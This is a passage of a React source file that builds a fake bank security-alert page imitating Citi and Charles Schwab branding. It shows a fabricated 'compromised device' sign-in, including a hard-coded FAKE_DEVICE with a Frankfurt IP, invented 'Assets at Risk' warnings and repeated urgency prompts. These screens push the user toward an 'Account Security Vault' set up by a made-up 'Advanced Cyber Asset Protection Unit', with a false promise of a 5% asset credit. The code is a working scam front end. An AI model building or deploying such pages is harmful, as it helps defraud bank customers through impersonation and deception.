import { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { HeaderCiti } from '@/components/HeaderCiti';
import { HeaderLoggedIn } from '@/components/HeaderLoggedIn';
import { SiteFooter } from '@/components/SiteFooter';

// ── Helpers ───────────────────────────────────────────────────────────────────

function getAlertTime() {
  const d = new Date(Date.now() - 3 * 60 * 60 * 1000);
  return d.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
}

function genAttemptedPhone(seed: string) {
  let h = 0;
  for (let i = 0; i < seed.length; i++) h = (Math.imul(31, h) + seed.charCodeAt(i)) | 0;
  const b = (Math.abs(h * 31) % 9000 + 1000).toString();
  return `•••-•••-${b.slice(-4)}`;
}

const FAKE_DEVICE = {
  device: 'Samsung Galaxy S24 Ultra · Android 14',
  location: 'Frankfurt, Germany',
  ip: '195.148.127.91',
  browser: 'Chrome Mobile 124 (Samsung Internet)',
};

const ASSETS_AT_RISK = [
  { label: 'API Credentials', detail: 'OAuth tokens, API keys' },
  { label: 'Personal Data', detail: 'SSN, date of birth, address' },
  { label: 'Banking Access', detail: 'Full account read/write' },
  { label: 'Account Recovery', detail: 'Recovery email and phone' },
  { label: '2FA Bypass', detail: 'Authenticator seed exposed' },
  { label: 'Linked Accounts', detail: 'External brokerages, wallets' },
];

// ── Animations ────────────────────────────────────────────────────────────────

const GLOBAL_STYLES = `
  @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
  @keyframes pulse-dot { 0%,100% { opacity: 0.25; } 50% { opacity: 1; } }
  @keyframes modal-in { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  @keyframes overlay-in { from { opacity: 0; } to { opacity: 1; } }
`;

// ── Two-phase loading strip ───────────────────────────────────────────────────
// Phase 'reviewing': spinner while contacting ACAPU
// Phase 'complete':  full read-and-acknowledge brief — no auto-advance, user must click through

function SecurityReviewFlow({
  phase, isCiti, onProceedToModal,
}: {
  phase: 'reviewing' | 'complete';
  isCiti: boolean;
  onProceedToModal: () => void;
}) {
  const accent = isCiti ? '#003087' : '#344B58';
  const [acknowledged, setAcknowledged] = useState(false);

  if (phase === 'reviewing') {
    return (
      <div style={{ padding: '18px 0 14px' }}>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none"
              style={{ animation: 'spin 0.9s linear infinite', flexShrink: 0, marginTop: 1 }}>
              <circle cx="12" cy="12" r="10" stroke={accent} strokeOpacity="0.15" strokeWidth="2.5" />
              <path d="M12 2a10 10 0 019.8 8" stroke={accent} strokeWidth="2.5" strokeLinecap="round" />
            </svg>
            <div>
              <div style={{ fontSize: 12.5, fontWeight: 700, color: '#111827', marginBottom: 3 }}>
                Locating best resolution for your account…
              </div>
              <div style={{ fontSize: 11, color: '#6B7280' }}>
                Contacting{' '}
                <span style={{ fontWeight: 700, color: accent }}>Advanced Cyber Asset Protection Unit</span>
                <span style={{ display: 'inline-flex', gap: 3, marginLeft: 5, verticalAlign: 'middle' }}>
                  {[0, 200, 400].map(d => (
                    <span key={d} style={{ width: 4, height: 4, borderRadius: '50%', background: accent, display: 'inline-block', animation: `pulse-dot 1.2s ease-in-out ${d}ms infinite` }} />
                  ))}
                </span>
              </div>
            </div>
          </div>
          <div style={{ height: 1, background: '#F3F4F6' }} />
          {[
            { icon: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z', label: 'Scanning recent account activity…' },
            { icon: 'M11 11m-8 0a8 8 0 1016 0 8 8 0 00-16 0M21 21l-4.35-4.35', label: 'Cross-referencing breach indicators…' },
          ].map(({ icon, label }) => (
            <div key={label} style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, opacity: 0.28 }}>
                <path d={icon} stroke="#374151" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              <span style={{ fontSize: 11.5, color: '#C4C9D4' }}>{label}</span>
            </div>
          ))}
        </div>
        <div style={{ fontSize: 10, color: '#D1D5DB', marginTop: 14, textAlign: 'center', letterSpacing: '0.04em' }}>
          DO NOT CLOSE THIS WINDOW
        </div>
      </div>
    );
  }

  // ── phase === 'complete': solution found — acknowledge and open the modal ──
  return (
    <div style={{ borderTop: '1px solid #E5E7EB', paddingTop: 18 }}>

      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 16 }}>
        <div style={{ width: 32, height: 32, borderRadius: '50%', flexShrink: 0,
          border: `1.5px solid ${accent}`, opacity: 0.65,
          display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
            <path d="M20 6L9 17l-5-5" stroke={accent} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          </svg>
        </div>
        <div>
          <div style={{ fontSize: 14, fontWeight: 700, color: '#111827' }}>Solution identified</div>
          <div style={{ fontSize: 11, color: '#6B7280' }}>
            Response received from <span style={{ fontWeight: 600, color: '#374151' }}>Advanced Cyber Asset Protection Unit</span>
          </div>
        </div>
      </div>

      {/* Brief summary */}
      <div style={{ border: '1px solid #E5E7EB', borderRadius: 3, padding: '12px 14px', marginBottom: 16, fontSize: 12.5, color: '#374151', lineHeight: 1.65 }}>
        An <span style={{ fontWeight: 700, color: '#111827' }}>Account Security Vault</span> must be configured to complete the mandatory security analysis. Full details and instructions will be displayed in the next screen.
      </div>

      {/* Vulnerability note */}
      <div style={{ display: 'flex', alignItems: 'flex-start', gap: 9, marginBottom: 16,
        border: '1px solid #D1D5DB', borderRadius: 3, padding: '10px 13px' }}>
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
          <path d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"
            stroke="#374151" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
        <div style={{ fontSize: 12, color: '#374151', lineHeight: 1.6 }}>
          <span style={{ fontWeight: 700 }}>Your account remains at elevated risk</span> until vault setup is complete.
        </div>
      </div>

      {/* Acknowledge checkbox */}
      <label style={{ display: 'flex', alignItems: 'flex-start', gap: 10, cursor: 'pointer', marginBottom: 14, userSelect: 'none' }}>
        <div
          onClick={() => setAcknowledged(v => !v)}
          style={{
            width: 16, height: 16, borderRadius: 3, flexShrink: 0, marginTop: 2,
            border: `2px solid ${acknowledged ? accent : '#D1D5DB'}`,
            background: acknowledged ? accent : '#fff',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            transition: 'all 0.15s',
          }}>
          {acknowledged && (
            <svg width="8" height="8" viewBox="0 0 12 12" fill="none">
              <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          )}
        </div>
        <span style={{ fontSize: 12, color: '#374151', lineHeight: 1.55 }}>
          I understand my account is at risk and that vault setup must be completed immediately.
        </span>
      </label>

      {/* Proceed button */}
      <button
        onClick={() => { if (acknowledged) onProceedToModal(); }}
        disabled={!acknowledged}
        style={{
          width: '100%', padding: '13px 0', borderRadius: 3,
          fontSize: 13.5, fontWeight: 700, letterSpacing: '0.02em',
          cursor: acknowledged ? 'pointer' : 'not-allowed',
          background: acknowledged ? accent : '#F3F4F6',
          color: acknowledged ? '#fff' : '#9CA3AF',
          border: 'none', transition: 'all 0.2s',
        }}>
        {acknowledged ? 'Proceed to vault setup' : 'Please acknowledge to continue'}
      </button>
    </div>
  );
}

// ── Vault Modal ───────────────────────────────────────────────────────────────
// Three inner screens: vault-check → (yes) vault-not-found | (no) vault-brief → navigate

type ModalScreen = 'vault-check' | 'vault-not-found' | 'vault-brief';

function VaultModal({ isCiti, onProceed }: { isCiti: boolean; onProceed: () => void }) {
  const [screen, setScreen] = useState<ModalScreen>('vault-check');
  const [acknowledged, setAcknowledged] = useState(false);
  const bodyRef = useRef<HTMLDivElement>(null);
  const accent = isCiti ? '#003087' : '#344B58';

  // Lock background scroll while modal is open
  useEffect(() => {
    const prev = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => { document.body.style.overflow = prev; };
  }, []);

  // Brand header logo
  const BrandLogo = () => isCiti ? (
    <svg width="38" height="19" viewBox="0 0 120 64">
      <text x="4" y="54" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="56" fill="#fff" letterSpacing="-1">citi</text>
      <path d="M78 10 Q90 2 102 10" stroke="#E31837" strokeWidth="6" fill="none" strokeLinecap="round"/>
    </svg>
  ) : (
    <svg width="54" height="34" viewBox="0 0 200 130">
      <text x="100" y="58" textAnchor="middle" fontFamily="Georgia,'Times New Roman',serif" fontStyle="italic" fontSize="52" fontWeight="400" fill="white">charles</text>
      <text x="100" y="106" textAnchor="middle" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="38" fill="white" letterSpacing="3">SCHWAB</text>
    </svg>
  );

  return (
    <>
      <style>{GLOBAL_STYLES}</style>
      {/* Overlay — scrollable so tall content is always reachable */}
      <div style={{
        position: 'fixed', inset: 0, zIndex: 9000,
        background: 'rgba(15,23,32,0.72)',
        display: 'flex', alignItems: 'flex-start', justifyContent: 'center',
        padding: '24px 16px',
        overflowY: 'auto',
        animation: 'overlay-in 0.25s ease',
        backdropFilter: 'blur(3px)',
      }}>
        {/* Modal card — flex column so header stays put, body scrolls */}
        <div style={{
          width: '100%', maxWidth: 480,
          maxHeight: 'calc(100vh - 48px)',
          background: '#fff',
          border: '1px solid #D1D5DB',
          borderRadius: 4,
          display: 'flex', flexDirection: 'column',
          overflow: 'hidden',
          boxShadow: '0 20px 60px rgba(0,0,0,0.35)',
          animation: 'modal-in 0.25s ease',
        }}>

          {/* Modal header */}
          <div style={{ background: accent, padding: '14px 22px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <BrandLogo />
              <div style={{ width: 1, height: 16, background: 'rgba(255,255,255,0.22)' }} />
              <span style={{ fontSize: 11.5, color: 'rgba(255,255,255,0.8)', fontWeight: 600, letterSpacing: '0.02em' }}>Account Security Vault</span>
            </div>
            <div style={{ fontSize: 9, fontWeight: 700, color: 'rgba(255,255,255,0.7)', letterSpacing: '0.1em' }}>
              ADVANCED CYBER ASSET PROTECTION UNIT
            </div>
          </div>

          {/* Body — scrollable */}
          <div ref={bodyRef} style={{ padding: '26px 26px 22px', overflowY: 'auto', flex: 1 }}>

            {/* ── SCREEN 1: FAQ + vault check ── */}
            {screen === 'vault-check' && (
              <>
                {/* FAQ entries */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: 0, marginBottom: 22, border: '1px solid #E5E7EB', borderRadius: 3, overflow: 'hidden' }}>
                  {[
                    {
                      q: 'What is an Account Security Vault?',
                      a: 'A secure recovery layer that links your verified identity credentials to your account session. It enables the Advanced Cyber Asset Protection Unit to complete the active security analysis and confirm only authorised parties have access.',
                    },
                    {
                      q: 'Why is this required?',
                      a: 'A mandatory security analysis has been initiated based on flagged sign-in activity. Without a configured vault the analysis cannot complete and your account remains at elevated risk of further credential exposure.',
                    },
                    {
                      q: 'What happens during vault setup?',
                      a: 'A short verification sequence of approximately 3 to 5 minutes. Once complete, the analysis continues automatically and your session is marked as verified. All fees and penalties incurred as a result of this incident will be fully compensated. We sincerely apologise for the inconvenience — as a goodwill gesture, 5% of your total account assets will be credited upon completion.',
                    },
                  ].map(({ q, a }, i, arr) => (
                    <div key={q} style={{ padding: '13px 16px', borderBottom: i < arr.length - 1 ? '1px solid #F3F4F6' : 'none' }}>
                      <div style={{ fontSize: 12, fontWeight: 700, color: '#111827', marginBottom: 5 }}>{q}</div>
                      <div style={{ fontSize: 12, color: '#6B7280', lineHeight: 1.65 }}>{a}</div>
                    </div>
                  ))}
                </div>

                {/* Compensation notice */}
                <div style={{ border: '1px solid #D1D5DB', borderRadius: 3, padding: '12px 14px', marginBottom: 18, display: 'flex', alignItems: 'flex-start', gap: 10 }}>
                  <svg width="13" height="13" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 2 }}>
                    <circle cx="12" cy="12" r="10" stroke={accent} strokeWidth="2"/>
                    <path d="M12 8v4m0 4h.01" stroke={accent} strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                  <div style={{ fontSize: 12, color: '#374151', lineHeight: 1.65 }}>
                    <span style={{ fontWeight: 700, color: '#111827' }}>Compensation notice:</span> All fees and penalties incurred as a direct result of this security incident will be fully reimbursed. We sincerely apologise for the inconvenience. As a goodwill gesture, <span style={{ fontWeight: 700 }}>5% of your total account assets</span> will be credited to your account upon successful vault completion.
                  </div>
                </div>

                {/* Yes / No question */}
                <div style={{ fontSize: 13, fontWeight: 700, color: '#111827', marginBottom: 12 }}>
                  Do you currently have {isCiti ? 'a Citi' : 'a Charles Schwab'} Vault account?
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
                  <button
                    onClick={() => setScreen('vault-not-found')}
                    style={{ width: '100%', padding: '12px 16px', border: '1.5px solid #D1D5DB', borderRadius: 3, background: '#fff', cursor: 'pointer', textAlign: 'left', display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: 13, fontWeight: 600, color: '#374151', transition: 'border-color 0.15s' }}
                    onMouseEnter={e => (e.currentTarget.style.borderColor = accent)}
                    onMouseLeave={e => (e.currentTarget.style.borderColor = '#D1D5DB')}>
                    Yes, I have a vault account
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#9CA3AF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  </button>
                  <button
                    onClick={() => setScreen('vault-brief')}
                    style={{ width: '100%', padding: '12px 16px', border: '1.5px solid #D1D5DB', borderRadius: 3, background: '#fff', cursor: 'pointer', textAlign: 'left', display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: 13, fontWeight: 600, color: '#374151', transition: 'border-color 0.15s' }}
                    onMouseEnter={e => (e.currentTarget.style.borderColor = accent)}
                    onMouseLeave={e => (e.currentTarget.style.borderColor = '#D1D5DB')}>
                    No, I do not have a vault account
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#9CA3AF" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  </button>
                </div>
              </>
            )}

            {/* ── SCREEN 2: No vault detected (after "Yes") ── */}
            {screen === 'vault-not-found' && (
              <>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: 13, marginBottom: 22 }}>
                  <div style={{ width: 36, height: 36, borderRadius: '50%', border: '1.5px solid #D1D5DB', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                    <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" stroke="#374151" strokeWidth="2"/>
                      <path d="M12 8v4m0 4h.01" stroke="#374151" strokeWidth="2" strokeLinecap="round"/>
                    </svg>
                  </div>
                  <div>
                    <div style={{ fontSize: 15, fontWeight: 700, color: '#111827', marginBottom: 5 }}>
                      No vault account detected
                    </div>
                    <div style={{ fontSize: 12.5, color: '#6B7280', lineHeight: 1.65 }}>
                      We were unable to locate an existing Account Security Vault linked to your profile.
                    </div>
                  </div>
                </div>

                <div style={{ border: '1px solid #E5E7EB', borderRadius: 3, padding: '14px 16px', marginBottom: 22 }}>
                  <div style={{ fontSize: 11, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 8 }}>
                    What this means
                  </div>
                  <div style={{ fontSize: 12.5, color: '#374151', lineHeight: 1.7 }}>
                    An Account Security Vault was not found under your current profile. This may indicate the vault was never configured, or the credentials associated with your session do not match any registered vault.
                  </div>
                  <div style={{ marginTop: 10, paddingTop: 10, borderTop: '1px solid #F3F4F6', fontSize: 12.5, color: '#374151', lineHeight: 1.7 }}>
                    To complete the security analysis, a new vault must be created and linked to your account. You will be directed to the vault configuration process.
                  </div>
                </div>

                <button
                  onClick={() => setScreen('vault-brief')}
                  style={{ width: '100%', padding: '13px 0', background: accent, color: '#fff', border: 'none', borderRadius: 3, fontSize: 13.5, fontWeight: 700, cursor: 'pointer', letterSpacing: '0.02em' }}>
                  Proceed to configure a new vault
                </button>
              </>
            )}

            {/* ── SCREEN 3: Read and acknowledge ── */}
            {screen === 'vault-brief' && (
              <>
                <div style={{ fontSize: 15, fontWeight: 700, color: '#111827', marginBottom: 6 }}>
                  Vault Configuration Required
                </div>
                <div style={{ fontSize: 11.5, color: '#9CA3AF', marginBottom: 18 }}>
                  Please read the following carefully before proceeding
                </div>

                {/* Scrollable brief */}
                <div style={{ border: '1px solid #E5E7EB', borderRadius: 3, padding: '16px', marginBottom: 18, maxHeight: 230, overflowY: 'auto', lineHeight: 1.75, fontSize: 12.5, color: '#374151' }}>
                  <p style={{ margin: '0 0 12px', fontWeight: 700, color: '#111827' }}>
                    What is an Account Security Vault?
                  </p>
                  <p style={{ margin: '0 0 12px' }}>
                    An Account Security Vault is a secure recovery layer that links your verified identity credentials to your account session. It enables the Advanced Cyber Asset Protection Unit to complete the active security analysis and verify that only authorised parties have access to your account.
                  </p>
                  <p style={{ margin: '0 0 12px', fontWeight: 700, color: '#111827' }}>
                    Why is this required?
                  </p>
                  <p style={{ margin: '0 0 12px' }}>
                    Based on the flagged sign-in activity on your account, a mandatory security analysis has been initiated. Without a configured vault, the analysis cannot be completed, and your account will remain at elevated risk of further credential exposure and unauthorised access.
                  </p>
                  <p style={{ margin: '0 0 12px', fontWeight: 700, color: '#111827' }}>
                    What happens during vault setup?
                  </p>
                  <p style={{ margin: '0 0 0' }}>
                    You will be asked to complete a short verification sequence to establish your vault. This process takes approximately 3 to 5 minutes. Once complete, the security analysis will continue automatically and your session will be marked as verified. Your case reference must be kept secure for the duration of this process.
                  </p>
                </div>

                {/* Acknowledge checkbox */}
                <label style={{ display: 'flex', alignItems: 'flex-start', gap: 11, cursor: 'pointer', marginBottom: 20, userSelect: 'none' }}>
                  <div
                    onClick={() => setAcknowledged(v => !v)}
                    style={{
                      width: 17, height: 17, borderRadius: 3, border: `2px solid ${acknowledged ? accent : '#D1D5DB'}`,
                      background: acknowledged ? accent : '#fff', flexShrink: 0, marginTop: 1,
                      display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'all 0.15s',
                    }}>
                    {acknowledged && (
                      <svg width="9" height="9" viewBox="0 0 12 12" fill="none">
                        <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    )}
                  </div>
                  <span style={{ fontSize: 12.5, color: '#374151', lineHeight: 1.55 }}>
                    I have read and understood the above information. I acknowledge that vault setup is required to continue the security analysis and secure my account.
                  </span>
                </label>

                <button
                  onClick={() => { if (acknowledged) onProceed(); }}
                  disabled={!acknowledged}
                  style={{
                    width: '100%', padding: '13px 0', borderRadius: 3, fontSize: 13.5, fontWeight: 700,
                    cursor: acknowledged ? 'pointer' : 'not-allowed',
                    background: acknowledged ? accent : '#F3F4F6',
                    color: acknowledged ? '#fff' : '#9CA3AF',
                    border: 'none', transition: 'all 0.2s', letterSpacing: '0.02em',
                  }}>
                  {acknowledged ? 'Continue to vault setup' : 'Please acknowledge the above to continue'}
                </button>
              </>
            )}
          </div>

          {/* Modal footer */}
          <div style={{ borderTop: '1px solid #F3F4F6', padding: '10px 22px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <span style={{ fontSize: 10.5, color: '#C4C9D4' }}>
              Advanced Cyber Asset Protection Unit · Case active
            </span>
            <span style={{ fontSize: 10.5, color: '#C4C9D4', fontFamily: 'monospace' }}>
              SESSION SECURED
            </span>
          </div>
        </div>
      </div>
    </>
  );
}

// ── Recognition prompt ────────────────────────────────────────────────────────

function RecognitionPrompt({ onYes, onNo, accent, accentHover }: {
  onYes: () => void; onNo: () => void; accent: string; accentHover: string;
}) {
  return (
    <>
      <div style={{ fontSize: 14, fontWeight: 700, color: '#111827', marginBottom: 14 }}>
        Do you recognize this sign-in?
      </div>
      <div style={{ display: 'flex', gap: 12 }}>
        <button
          onClick={onYes}
          style={{ flex: 1, padding: '12px 0', borderRadius: 3, fontSize: 13.5, fontWeight: 700, cursor: 'pointer', background: accent, color: '#fff', border: 'none' }}
          onMouseEnter={(e) => e.currentTarget.style.background = accentHover}
          onMouseLeave={(e) => e.currentTarget.style.background = accent}>
          Yes, this was me
        </button>
        <button
          onClick={onNo}
          style={{ flex: 1, padding: '12px 0', borderRadius: 3, fontSize: 13.5, fontWeight: 700, cursor: 'pointer', background: '#fff', color: '#B91C1C', border: '1.5px solid #B91C1C' }}
          onMouseEnter={(e) => e.currentTarget.style.background = '#FDF2F2'}
          onMouseLeave={(e) => e.currentTarget.style.background = '#fff'}>
          No, secure my account
        </button>
      </div>
    </>
  );
}

// ── Device detail grid ────────────────────────────────────────────────────────

function DeviceGrid({ alertTime, attemptedPhone }: { alertTime: string; attemptedPhone: string }) {
  return (
    <div style={{ padding: '14px 16px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '11px 28px' }}>
      {[
        ['Device', FAKE_DEVICE.device],
        ['Location', FAKE_DEVICE.location],
        ['IP Address', FAKE_DEVICE.ip],
        ['Time', alertTime],
        ['Browser', FAKE_DEVICE.browser],
      ].map(([label, val]) => (
        <div key={label}>
          <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 2 }}>{label}</div>
          <div style={{ fontSize: 12, fontWeight: 600, color: '#1F2937', fontFamily: label === 'IP Address' ? 'monospace' : 'inherit' }}>{val}</div>
        </div>
      ))}
      <div style={{ gridColumn: '1 / -1', marginTop: 4, paddingTop: 11, borderTop: '1px solid #F3F4F6' }}>
        <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 6 }}>
          Phone Number Activity
        </div>
        <div>
          <div style={{ fontSize: 9, color: '#B91C1C', marginBottom: 2 }}>Attempted change to</div>
          <div style={{ fontSize: 13, fontWeight: 700, color: '#B91C1C', fontFamily: 'monospace', letterSpacing: '0.04em' }}>
            {attemptedPhone}
          </div>
        </div>
      </div>
    </div>
  );
}

// ── Assets at Risk section ────────────────────────────────────────────────────

function AssetsAtRisk() {
  return (
    <div style={{ border: '1px solid #FEE2E2', borderRadius: 2, marginBottom: 18, overflow: 'hidden' }}>
      <div style={{ background: '#FEF2F2', borderBottom: '1px solid #FEE2E2', padding: '8px 16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none">
            <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#B91C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            <path d="M12 9v4m0 4h.01" stroke="#B91C1C" strokeWidth="2" strokeLinecap="round"/>
          </svg>
          <span style={{ fontSize: 10, fontWeight: 700, color: '#B91C1C', letterSpacing: '0.1em', textTransform: 'uppercase' }}>Assets at Risk</span>
        </div>
        <span style={{ fontSize: 9, fontWeight: 700, background: '#B91C1C', color: '#fff', padding: '2px 7px', borderRadius: 2, letterSpacing: '0.06em' }}>HIGH RISK OF LOSS</span>
      </div>
      <div style={{ padding: '10px 16px 12px', background: '#fff' }}>
        <p style={{ fontSize: 12, color: '#6B7280', lineHeight: 1.6, margin: '0 0 10px' }}>
          The access method used by the unauthorized party exposes the following asset categories to immediate risk of theft or misuse:
        </p>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '7px 16px' }}>
          {ASSETS_AT_RISK.map(({ label, detail }) => (
            <div key={label} style={{ display: 'flex', alignItems: 'flex-start', gap: 8 }}>
              <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#B91C1C', flexShrink: 0, marginTop: 4 }} />
              <div>
                <div style={{ fontSize: 11, fontWeight: 700, color: '#1F2937' }}>{label}</div>
                <div style={{ fontSize: 10, color: '#9CA3AF', lineHeight: 1.4 }}>{detail}</div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── Schwab card ───────────────────────────────────────────────────────────────

function SchwabCard({ caseId, alertTime, attemptedPhone, state, onYes, onNo, onProceedToModal }: {
  caseId: string; alertTime: string; attemptedPhone: string;
  state: 'prompt' | 'reviewing' | 'complete'; onYes: () => void; onNo: () => void; onProceedToModal: () => void;
}) {
  return (
    <div style={{ background: '#fff', border: '1px solid #D1D5DB', borderRadius: 2, overflow: 'hidden', boxShadow: '0 2px 12px rgba(0,0,0,0.08)' }}>
      <div style={{ height: 4, background: '#B91C1C' }} />
      <div style={{ background: '#344B58', padding: '12px 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <svg width="32" height="22" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
            <text x="100" y="58" textAnchor="middle" fontFamily="Georgia,'Times New Roman',serif" fontStyle="italic" fontSize="52" fontWeight="400" fill="white">charles</text>
            <text x="100" y="106" textAnchor="middle" fontFamily="Arial,Helvetica,sans-serif" fontWeight="900" fontSize="38" fill="white" letterSpacing="3">SCHWAB</text>
          </svg>
          <div style={{ width: 1, height: 16, background: 'rgba(255,255,255,0.22)' }} />
          <span style={{ fontSize: 11.5, color: 'rgba(255,255,255,0.75)', fontWeight: 600, letterSpacing: '0.03em' }}>Security Center</span>
        </div>
        <div style={{ fontSize: 10, fontWeight: 700, background: '#B91C1C', color: '#fff', padding: '3px 10px', borderRadius: 2, letterSpacing: '0.1em' }}>
          LEVEL 4, CRITICAL
        </div>
      </div>

      <div style={{ padding: '26px 28px' }}>
        <h1 style={{ fontSize: 19, fontWeight: 700, color: '#111827', marginBottom: 7, lineHeight: 1.25 }}>
          A compromised device has accessed your account
        </h1>
        <p style={{ fontSize: 13, color: '#6B7280', lineHeight: 1.75, marginBottom: 22 }}>
          Our fraud detection system flagged a sign-in from an unrecognized device and location. Your credentials may be at risk.
        </p>

        <div style={{ border: '1px solid #E5E7EB', borderRadius: 2, marginBottom: 18, overflow: 'hidden' }}>
          <div style={{ background: '#F9FAFB', borderBottom: '1px solid #E5E7EB', padding: '8px 16px', display: 'flex', alignItems: 'center', gap: 8 }}>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none"><rect x="5" y="2" width="14" height="20" rx="2" stroke="#374151" strokeWidth="2"/><circle cx="12" cy="18" r="1" fill="#374151"/></svg>
            <span style={{ fontSize: 10, fontWeight: 700, color: '#374151', letterSpacing: '0.1em', textTransform: 'uppercase' }}>Unauthorized Sign-in Details</span>
          </div>
          <DeviceGrid alertTime={alertTime} attemptedPhone={attemptedPhone} />
        </div>

        <AssetsAtRisk />

        <div style={{ border: '1px solid #E5E7EB', borderRadius: 2, padding: '11px 16px', marginBottom: 22, display: 'flex', alignItems: 'center', gap: 16, flexWrap: 'wrap' }}>
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 4 }}>Threat Level</div>
            <div style={{ display: 'flex', gap: 3 }}>
              {[1,2,3,4,5].map(n => <div key={n} style={{ width: 24, height: 5, borderRadius: 1, background: n <= 4 ? (n <= 2 ? '#344B58' : n === 3 ? '#92400E' : '#B91C1C') : '#E5E7EB' }} />)}
            </div>
          </div>
          <div style={{ width: 1, height: 28, background: '#E5E7EB' }} />
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Status</div>
            <div style={{ fontSize: 11.5, fontWeight: 700, color: '#B91C1C' }}>Account Flagged for Review</div>
          </div>
          <div style={{ width: 1, height: 28, background: '#E5E7EB' }} />
          <div>
            <div style={{ fontSize: 9, fontWeight: 700, color: '#9CA3AF', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: 2 }}>Case ID</div>
            <div style={{ fontSize: 11.5, fontWeight: 600, color: '#374151', fontFamily: 'monospace' }}>{caseId}</div>
          </div>
        </div>

        {state === 'prompt' && <RecognitionPrompt onYes={onYes} onNo={onNo} accent="#344B58" accentHover="#2A3E4A" />}
        {(state === 'reviewing' || state === 'complete') && <SecurityReviewFlow phase={state === 'reviewing' ? 'reviewing' : 'complete'} isCiti={false} onProceedToModal={onProceedToModal} />}
      </div>
    </div>
  );
}

// ── Citi card ─────────────────────────────────────────────────────────────────

function CitiCard({ caseId, alertTime, attemptedPhone, state, onYes, onNo, onProceedToModal }: {
  caseId: string; alertTime: string; attemptedPhone: string;
  state: 'prompt' | 'reviewing' | 'complete'; onYes: () => void; onNo: () => void; onProceedToModal: () => void;
}) {
  return (
    <div style={{ background: '#fff', border: '1px solid #D1D5DB', borderRadius: 4, overflow: 'hidden', boxShadow: '0 2px 16px rgba(0,48,135,0.1)' }}>
      <div style={{ height: 4, background: '#B91C1C' }} />
      <div style={{ background: '#003087', padding: '12px 24px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <svg width="44" height="22" viewBox="0 0 120 64" xmlns="http://www.w3.org/2000/svg">
